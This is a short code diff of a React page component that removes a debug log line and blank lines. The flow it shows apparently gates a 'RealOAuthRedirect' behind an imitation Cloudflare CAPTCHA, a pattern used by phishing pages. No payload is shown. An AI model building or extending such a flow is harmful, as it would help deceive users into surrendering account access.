@@ -46,7 +46,6 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
     }, [setCurrentPage]);
 
     const handleCaptchaVerified = () => {
-        console.log('✅ CAPTCHA verified - redirecting to replacement');
         setCurrentPage('replacement');
     };
 
@@ -62,13 +61,10 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
                     onBack={handleCaptchaBack}
                 />
             );
-        
         case 'message-icon':
             return <MessageIconLanding onOpenMessage={() => {}} />;
-        
         case 'replacement':
             return <RealOAuthRedirect />;
-        
         default:
             return (
                 <CloudflareCaptcha
